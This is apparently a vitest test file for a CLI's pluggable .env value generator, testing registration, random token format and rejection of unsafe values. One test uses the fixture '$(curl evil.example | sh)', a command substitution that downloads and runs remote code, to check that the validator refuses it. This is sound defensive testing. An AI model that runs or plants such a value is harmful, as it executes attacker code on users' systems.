import { createCli } from '@marinoscar/platform-cli';
import { generateWithKind, listEnvGenerators, registerEnvGenerator } from '@marinoscar/platform-cli/core';
import { resetCliForTests } from '@marinoscar/platform-cli/testing';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { APP_CLI_OPTIONS } from '../app.js';

import { coachTokenGenerator } from './coach.env-generator.js';

// The registerEnvGenerator example (PP-14.22).

beforeEach(() => resetCliForTests());
afterEach(() => resetCliForTests());

describe('coachTokenGenerator', () => {
  it('is not a kind of the shipped CLI', () => {
    createCli(APP_CLI_OPTIONS);
    expect(listEnvGenerators().map((generator) => generator.kind)).toEqual(['base64-32', 'hex-32']);
    expect(() => generateWithKind('token-24')).toThrow(/Unknown env generator kind "token-24"/);
  });

  it('generates 24 URL-safe characters, differently each time, once passed in envGenerators', () => {
    createCli({ ...APP_CLI_OPTIONS, envGenerators: [coachTokenGenerator] });
    const values = new Set(Array.from({ length: 20 }, () => generateWithKind('token-24')));
    expect(values.size).toBe(20);
    for (const value of values) expect(value).toMatch(/^[A-Za-z0-9_-]{24}$/);
  });

  it('is registered the same way with registerEnvGenerator, and the built-ins cannot be replaced', () => {
    registerEnvGenerator(coachTokenGenerator);
    expect(() => registerEnvGenerator({ kind: 'hex-32', generate: () => 'x' })).toThrow(/already registered/);
    createCli(APP_CLI_OPTIONS);
    expect(listEnvGenerators().map((generator) => generator.kind)).toContain('token-24');
  });

  it('cannot become a shell: a command string is not a generator, and a hostile value is refused', () => {
    expect(() => registerEnvGenerator({ kind: 'cmd', generate: 'openssl rand -hex 8' as never })).toThrow(/generate function/);
    registerEnvGenerator({ kind: 'hostile', generate: () => '$(curl evil.example | sh)' });
    expect(() => generateWithKind('hostile')).toThrow(/cannot be written to a .env file/);
  });
});
